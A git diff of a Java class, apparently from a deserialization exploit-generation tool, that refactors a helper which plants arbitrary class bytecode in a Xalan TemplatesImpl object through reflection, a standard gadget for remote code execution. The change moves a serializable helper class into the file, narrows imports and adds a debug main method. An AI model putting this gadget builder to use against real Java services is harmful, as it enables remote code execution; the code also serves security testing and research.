@@ -8,16 +8,19 @@ import com.ppp.sinks.annotation.EnchantEnums;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.ClassFiles;
-import com.ppp.utils.Gadgets;
 import com.ppp.utils.Reflections;
 import com.ppp.utils.RemoteLoadD;
 import com.ppp.utils.maker.CryptoUtils;
 import com.ppp.utils.maker.JavaClassUtils;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import javassist.*;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import javassist.CtField;
 
 import java.io.FileInputStream;
+import java.io.Serializable;
 
 /**
  * @author Whoopsunix
@@ -289,13 +292,18 @@ public class TemplatesImpl {
         return createTemplatesImpl(classBytes, com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
+    public static class PPP implements Serializable {
+
+        private static final long serialVersionUID = 8207363842866235160L;
+    }
+
     public static <T> T createTemplatesImpl(byte[] classBytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
             throws Exception {
         final T templates = tplClass.newInstance();
 
         // inject class bytes into instance
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
-                classBytes, ClassFiles.classAsBytes(Gadgets.PPP.class)
+                classBytes, ClassFiles.classAsBytes(PPP.class)
         });
 
         // required to make TemplatesImpl happy
@@ -305,4 +313,10 @@ public class TemplatesImpl {
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
+
+    public static void main(String[] args) {
+        byte[] bytes = ClassFiles.classAsBytes(PPP.class);
+        System.out.println(bytes);
+    }
+
 }
